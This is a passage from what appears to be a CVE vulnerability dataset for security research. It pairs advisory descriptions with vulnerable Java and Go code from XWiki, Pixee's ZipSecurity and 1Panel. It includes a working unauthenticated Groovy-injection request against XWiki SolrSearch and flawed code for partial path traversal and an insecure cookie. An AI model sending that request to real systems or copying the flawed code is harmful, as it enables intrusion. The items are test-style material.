    "description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Any guest can perform arbitrary remote code execution through a request to `SolrSearch`. This impacts the confidentiality, integrity and availability of the whole XWiki installation. To reproduce on an instance, without being logged in, go to `<host>/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28\"Hello%20from\"%20%2B%20\"%20search%20text%3A\"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20`. If there is an output, and the title of the RSS feed contains `Hello from search text:42`, then the instance is vulnerable. This vulnerability has been patched in XWiki 15.10.11, 16.4.1 and 16.5.0RC1. Users are advised to upgrade. Users unable to upgrade may edit `Main.SolrSearchMacros` in `SolrSearchMacros.xml` on line 955 to match the `rawResponse` macro in `macros.vm#L2824` with a content type of `application/xml`, instead of simply outputting the content of the feed.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-search/xwiki-platform-search-ui/src/test/java/org/xwiki/search/ui/DatabaseSearchPageTest.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.search.ui;\n\nimport java.io.PrintWriter;\nimport java.io.StringWriter;\n\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\nimport org.xwiki.model.reference.DocumentReference;\nimport org.xwiki.rendering.RenderingScriptServiceComponentList;\nimport org.xwiki.rendering.internal.configuration.DefaultRenderingConfigurationComponentList;\nimport org.xwiki.rendering.syntax.Syntax;\nimport org.xwiki.test.annotation.ComponentList;\nimport org.xwiki.test.page.HTML50ComponentList;\nimport org.xwiki.test.page.PageTest;\nimport org.xwiki.test.page.TestNoScriptMacro;\nimport org.xwiki.test.page.XWikiSyntax21ComponentList;\n\nimport com.xpn.xwiki.doc.XWikiDocument;\nimport com.xpn.xwiki.plugin.feed.FeedPlugin;\nimport com.xpn.xwiki.web.XWikiServletResponseStub;\n\nimport static org.junit.jupiter.api.Assertions.assertTrue;\n\n/**\n * Page test for {@code Main.DatabaseSearch}.\n *\n * @version $Id$\n */\n@ComponentList({\n    TestNoScriptMacro.class\n})\n@RenderingScriptServiceComponentList\n@DefaultRenderingConfigurationComponentList\n@HTML50ComponentList\n@XWikiSyntax21ComponentList\nclass DatabaseSearchPageTest extends PageTest\n{\n    private static final String WIKI_NAME = \"xwiki\";\n\n    private static final String MAIN_SPACE = \"Main\";\n\n    private static final DocumentReference DATABASE_SEARCH_REFERENCE =\n        new DocumentReference(WIKI_NAME, MAIN_SPACE, \"DatabaseSearch\");\n\n    @BeforeEach\n    void setUp()\n    {\n        this.xwiki.initializeMandatoryDocuments(this.context);\n\n        this.xwiki.getPluginManager().addPlugin(\"feed\", FeedPlugin.class.getName(), this.context);\n    }\n\n    @Test\n    void checkRSSFeedContent() throws Exception\n    {\n        String unescapedText = \"<b>}}}{{noscript}}</b>\";\n        String escapedText = \"&lt;b&gt;}}}{{noscript}}&lt;/b&gt;\";\n\n        this.request.put(\"text\", unescapedText);\n        this.context.setAction(\"get\");\n\n        XWikiDocument databaseSearchDocument = loadPage(DATABASE_SEARCH_REFERENCE);\n        this.context.setDoc(databaseSearchDocument);\n\n        // Get directly the writer to check the RSS feed.\n        StringWriter out = new StringWriter();\n        PrintWriter writer = new PrintWriter(out);\n        this.response = new XWikiServletResponseStub() {\n            @Override\n            public PrintWriter getWriter()\n            {\n                return writer;\n            }\n        };\n        this.context.setResponse(this.response);\n\n        String rssFeed = databaseSearchDocument.displayDocument(Syntax.PLAIN_1_0, this.context);\n        assertTrue(rssFeed.isEmpty());\n\n        rssFeed = out.toString();\n        assertTrue(rssFeed.contains(\"<title>search.rss [\" + escapedText + \"]</title>\"));\n        assertTrue(rssFeed.contains(\"<description>search.rss [\" + escapedText + \"]</description>\"));\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    void checkRSSFeedContent() throws Exception\n    {\n        String unescapedText = \"<b>}}}{{noscript}}</b>\";\n        String escapedText = \"&lt;b&gt;}}}{{noscript}}&lt;/b&gt;\";\n\n        this.request.put(\"text\", unescapedText);\n        this.context.setAction(\"get\");\n\n        XWikiDocument databaseSearchDocument = loadPage(DATABASE_SEARCH_REFERENCE);\n        this.context.setDoc(databaseSearchDocument);\n\n        // Get directly the writer to check the RSS feed.\n        StringWriter out = new StringWriter();\n        PrintWriter writer = new PrintWriter(out);\n        this.response = new XWikiServletResponseStub() {\n            @Override\n            public PrintWriter getWriter()\n            {\n                return writer;\n            }\n        };\n        this.context.setResponse(this.response);\n\n        String rssFeed = databaseSearchDocument.displayDocument(Syntax.PLAIN_1_0, this.context);\n        assertTrue(rssFeed.isEmpty());\n\n        rssFeed = out.toString();\n        assertTrue(rssFeed.contains(\"<title>search.rss [\" + escapedText + \"]</title>\"));\n        assertTrue(rssFeed.contains(\"<description>search.rss [\" + escapedText + \"]</description>\"));\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 97,
          "content": "        assertTrue(rssFeed.isEmpty());"
        }
      ]
    },
    "cwe": [
      "CWE-95",
      "CWE-94"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 612,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 217,
    "cve": "CVE-2024-24569",
    "description": "The Pixee Java Code Security Toolkit is a set of security APIs meant to help secure Java code. `ZipSecurity#isBelowCurrentDirectory` is vulnerable to a partial-path traversal bypass. To be vulnerable to the bypass, the application must use toolkit version <=1.1.1, use ZipSecurity as a guard against path traversal, and have an exploit path. Although the control still protects attackers from escaping the application path into higher level directories (e.g., /etc/), it will allow \"escaping\" into sibling paths. For example, if your running path is /my/app/path you an attacker could navigate into /my/app/path-something-else. This vulnerability is patched in 1.1.2.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/main/java/io/github/pixee/security/ZipSecurity.java",
          "content": "package io.github.pixee.security;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.charset.Charset;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\n/**\n * This type exposes helper methods to deal with attacks related to Zipping operations, most notably\n * the \"zip slip\" attack.\n */\npublic final class ZipSecurity {\n\n  private ZipSecurity() {}\n\n  /**\n   * Returns a {@link ZipInputStream} that will check to make sure that paths encountered in the zip\n   * aren't absolute and don't contain escapes (\"..\") towards directories outside the zip's root.\n   */\n  public static ZipInputStream createHardenedInputStream(\n      final InputStream stream, final Charset charset) {\n    return new HardenedZipInputStream(stream, charset);\n  }\n\n  /**\n   * Returns a {@link ZipInputStream} that will check to make sure that paths encountered in the zip\n   * aren't absolute and don't contain escapes (\"..\") towards directories beyond the root of the\n   * zip.\n   */\n  public static ZipInputStream createHardenedInputStream(final InputStream stream) {\n    return new HardenedZipInputStream(stream);\n  }\n\n  private static class HardenedZipInputStream extends ZipInputStream {\n\n    private HardenedZipInputStream(final InputStream in) {\n      super(in);\n    }\n\n    private HardenedZipInputStream(final InputStream in, final Charset charset) {\n      super(in, charset);\n    }\n\n    /**\n     * {@inheritDoc}\n     *\n     * <p>Also checks to see that the path isn't absolute (starts with a root path), doesn't contain\n     * escapes that lead above the root of the zip.\n     */\n    @Override\n    public ZipEntry getNextEntry() throws IOException {\n      final ZipEntry entry = super.getNextEntry();\n      final String name = entry.getName();\n\n      if (!\"\".equals(name.trim())) {\n        if (isRootFileEntry(name)) {\n          throw new SecurityException(\"encountered zip file path that is absolute: \" + name);\n        }\n        if (containsEscapesAndTargetsBelowRoot(name)) {\n          throw new SecurityException(\"path to sensitive locations contained escapes: \" + name);\n        }\n      }\n      return entry;\n    }\n\n    private boolean containsEscapesAndTargetsBelowRoot(final String name) {\n      if (name.contains(\"../\") || name.contains(\"..\\\\\")) {\n        final File fileWithEscapes = new File(name);\n        try {\n          if (isBelowCurrentDirectory(fileWithEscapes)) {\n            return true;\n          }\n        } catch (IOException e) {\n          // we suppose this may happen in normal operation so best not to do anything\n        }\n      }\n      return false;\n    }\n\n    boolean isBelowCurrentDirectory(final File fileWithEscapes) throws IOException {\n      final File currentDirectory = new File(\"\");\n      String canonicalizedTargetPath = fileWithEscapes.getCanonicalPath();\n      String canonicalizedCurrentPath = currentDirectory.getCanonicalPath();\n      return !canonicalizedTargetPath.startsWith(canonicalizedCurrentPath);\n    }\n\n    private boolean isRootFileEntry(final String name) {\n      return name.startsWith(\"/\");\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "private boolean containsEscapesAndTargetsBelowRoot(final String name) {\n      if (name.contains(\"../\") || name.contains(\"..\\\\\")) {\n        final File fileWithEscapes = new File(name);\n        try {\n          if (isBelowCurrentDirectory(fileWithEscapes)) {\n            return true;\n          }\n        } catch (IOException e) {\n          // we suppose this may happen in normal operation so best not to do anything\n        }\n      }\n      return false;\n    }",
        "boolean isBelowCurrentDirectory(final File fileWithEscapes) throws IOException {\n      final File currentDirectory = new File(\"\");\n      String canonicalizedTargetPath = fileWithEscapes.getCanonicalPath();\n      String canonicalizedCurrentPath = currentDirectory.getCanonicalPath();\n      return !canonicalizedTargetPath.startsWith(canonicalizedCurrentPath);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 70,
          "content": "        final File fileWithEscapes = new File(name);"
        },
        {
          "line_no": 72,
          "content": "          if (isBelowCurrentDirectory(fileWithEscapes)) {"
        },
        {
          "line_no": 82,
          "content": "    boolean isBelowCurrentDirectory(final File fileWithEscapes) throws IOException {"
        },
        {
          "line_no": 83,
          "content": "      final File currentDirectory = new File(\"\");"
        },
        {
          "line_no": 84,
          "content": "      String canonicalizedTargetPath = fileWithEscapes.getCanonicalPath();"
        },
        {
          "line_no": 85,
          "content": "      String canonicalizedCurrentPath = currentDirectory.getCanonicalPath();"
        },
        {
          "line_no": 86,
          "content": "      return !canonicalizedTargetPath.startsWith(canonicalizedCurrentPath);"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 227,
    "cve": "CVE-2024-24768",
    "description": "1Panel is an open source Linux server operation and maintenance management panel. The HTTPS cookie that comes with the panel does not have the Secure keyword, which may cause the cookie to be sent in plain text if accessed using HTTP. This issue has been patched in version 1.9.6.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "backend/app/service/auth.go",
          "content": "package service\n\nimport (\n\t\"strconv\"\n\n\t\"github.com/1Panel-dev/1Panel/backend/app/dto\"\n\t\"github.com/1Panel-dev/1Panel/backend/buserr\"\n\t\"github.com/1Panel-dev/1Panel/backend/constant\"\n\t\"github.com/1Panel-dev/1Panel/backend/global\"\n\t\"github.com/1Panel-dev/1Panel/backend/utils/encrypt\"\n\t\"github.com/1Panel-dev/1Panel/backend/utils/jwt\"\n\t\"github.com/1Panel-dev/1Panel/backend/utils/mfa\"\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/google/uuid\"\n\t\"github.com/pkg/errors\"\n)\n\ntype AuthService struct{}\n\ntype IAuthService interface {\n\tCheckIsSafety(code string) (string, error)\n\tVerifyCode(code string) (bool, error)\n\tLogin(c *gin.Context, info dto.Login, entrance string) (*dto.UserLoginInfo, error)\n\tLogOut(c *gin.Context) error\n\tMFALogin(c *gin.Context, info dto.MFALogin, entrance string) (*dto.UserLoginInfo, error)\n}\n\nfunc NewIAuthService() IAuthService {\n\treturn &AuthService{}\n}\n\nfunc (u *AuthService) Login(c *gin.Context, info dto.Login, entrance string) (*dto.UserLoginInfo, error) {\n\tnameSetting, err := settingRepo.Get(settingRepo.WithByKey(\"UserName\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpasswordSetting, err := settingRepo.Get(settingRepo.WithByKey(\"Password\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpass, err := encrypt.StringDecrypt(passwordSetting.Value)\n\tif err != nil {\n\t\treturn nil, constant.ErrAuth\n\t}\n\tif info.Password != pass || nameSetting.Value != info.Name {\n\t\treturn nil, constant.ErrAuth\n\t}\n\tentranceSetting, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif len(entranceSetting.Value) != 0 && entranceSetting.Value != entrance {\n\t\treturn nil, buserr.New(constant.ErrEntrance)\n\t}\n\tmfa, err := settingRepo.Get(settingRepo.WithByKey(\"MFAStatus\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif err = settingRepo.Update(\"Language\", info.Language); err != nil {\n\t\treturn nil, err\n\t}\n\tif mfa.Value == \"enable\" {\n\t\treturn &dto.UserLoginInfo{Name: nameSetting.Value, MfaStatus: mfa.Value}, nil\n\t}\n\treturn u.generateSession(c, info.Name, info.AuthMethod)\n}\n\nfunc (u *AuthService) MFALogin(c *gin.Context, info dto.MFALogin, entrance string) (*dto.UserLoginInfo, error) {\n\tnameSetting, err := settingRepo.Get(settingRepo.WithByKey(\"UserName\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpasswordSetting, err := settingRepo.Get(settingRepo.WithByKey(\"Password\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpass, err := encrypt.StringDecrypt(passwordSetting.Value)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif info.Password != pass || nameSetting.Value != info.Name {\n\t\treturn nil, constant.ErrAuth\n\t}\n\tentranceSetting, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif len(entranceSetting.Value) != 0 && entranceSetting.Value != entrance {\n\t\treturn nil, buserr.New(constant.ErrEntrance)\n\t}\n\tmfaSecret, err := settingRepo.Get(settingRepo.WithByKey(\"MFASecret\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tmfaInterval, err := settingRepo.Get(settingRepo.WithByKey(\"MFAInterval\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tsuccess := mfa.ValidCode(info.Code, mfaInterval.Value, mfaSecret.Value)\n\tif !success {\n\t\treturn nil, constant.ErrAuth\n\t}\n\n\treturn u.generateSession(c, info.Name, info.AuthMethod)\n}\n\nfunc (u *AuthService) generateSession(c *gin.Context, name, authMethod string) (*dto.UserLoginInfo, error) {\n\tsetting, err := settingRepo.Get(settingRepo.WithByKey(\"SessionTimeout\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tlifeTime, err := strconv.Atoi(setting.Value)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tif authMethod == constant.AuthMethodJWT {\n\t\tj := jwt.NewJWT()\n\t\tclaims := j.CreateClaims(jwt.BaseClaims{\n\t\t\tName: name,\n\t\t})\n\t\ttoken, err := j.CreateToken(claims)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name, Token: token}, nil\n\t}\n\tsID, _ := c.Cookie(constant.SessionName)\n\tsessionUser, err := global.SESSION.Get(sID)\n\tif err != nil {\n\t\tsID = uuid.New().String()\n\t\tc.SetCookie(constant.SessionName, sID, 0, \"\", \"\", false, false)\n\t\terr := global.SESSION.Set(sID, sessionUser, lifeTime)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name}, nil\n\t}\n\tif err := global.SESSION.Set(sID, sessionUser, lifeTime); err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &dto.UserLoginInfo{Name: name}, nil\n}\n\nfunc (u *AuthService) LogOut(c *gin.Context) error {\n\tsID, _ := c.Cookie(constant.SessionName)\n\tif sID != \"\" {\n\t\tc.SetCookie(constant.SessionName, sID, -1, \"\", \"\", false, false)\n\t\terr := global.SESSION.Delete(sID)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\treturn nil\n}\n\nfunc (u *AuthService) VerifyCode(code string) (bool, error) {\n\tsetting, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn false, err\n\t}\n\treturn setting.Value == code, nil\n}\n\nfunc (u *AuthService) CheckIsSafety(code string) (string, error) {\n\tstatus, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tif len(status.Value) == 0 {\n\t\treturn \"disable\", nil\n\t}\n\tif status.Value == code {\n\t\treturn \"pass\", nil\n\t}\n\treturn \"unpass\", nil\n}\n"
        }
      ],
      "method_level": [
        "func (u *AuthService) generateSession(c *gin.Context, name, authMethod string) (*dto.UserLoginInfo, error) {\n\tsetting, err := settingRepo.Get(settingRepo.WithByKey(\"SessionTimeout\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tlifeTime, err := strconv.Atoi(setting.Value)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tif authMethod == constant.AuthMethodJWT {\n\t\tj := jwt.NewJWT()\n\t\tclaims := j.CreateClaims(jwt.BaseClaims{\n\t\t\tName: name,\n\t\t})\n\t\ttoken, err := j.CreateToken(claims)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name, Token: token}, nil\n\t}\n\tsID, _ := c.Cookie(constant.SessionName)\n\tsessionUser, err := global.SESSION.Get(sID)\n\tif err != nil {\n\t\tsID = uuid.New().String()\n\t\tc.SetCookie(constant.SessionName, sID, 0, \"\", \"\", false, false)\n\t\terr := global.SESSION.Set(sID, sessionUser, lifeTime)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name}, nil\n\t}\n\tif err := global.SESSION.Set(sID, sessionUser, lifeTime); err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &dto.UserLoginInfo{Name: name}, nil\n}",
